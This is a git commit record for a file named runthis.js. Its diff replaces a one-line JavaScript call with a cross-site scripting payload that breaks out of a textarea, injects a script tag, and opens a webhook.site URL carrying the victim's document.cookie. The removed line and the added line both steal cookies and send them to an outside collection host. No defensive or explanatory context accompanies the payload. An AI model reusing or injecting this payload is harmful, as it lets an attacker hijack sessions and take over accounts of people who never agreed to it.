30c1e0017024e4312664ed7905b492d44e3ea131
joaoppramos <107862363+joaoppramos@users.noreply.github.com>
2023-12-08 12:23:44 +0000

    Update runthis.js

--- runthis.js
+++ runthis.js
@@ -1,1 +1,1 @@
-window.open("https://webhook.site/cee0ef6f-da75-44fe-809b-ff3fd0494303?cookies="+document.cookie)
+</textarea><script>window.open("https://webhook.site/cee0ef6f-da75-44fe-809b-ff3fd0494303?cookies="+document.cookie)</script><textarea>
